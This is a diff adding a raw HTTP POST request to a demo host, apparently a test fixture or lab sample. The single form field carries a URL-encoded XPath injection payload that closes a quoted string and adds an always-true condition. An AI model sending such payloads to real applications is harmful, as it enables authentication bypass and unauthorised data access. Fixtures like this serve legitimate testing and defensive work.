@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 49
+Connection: close
+
+input=%22+or+string-length%28%2F%2A%29%3E0+or+%22
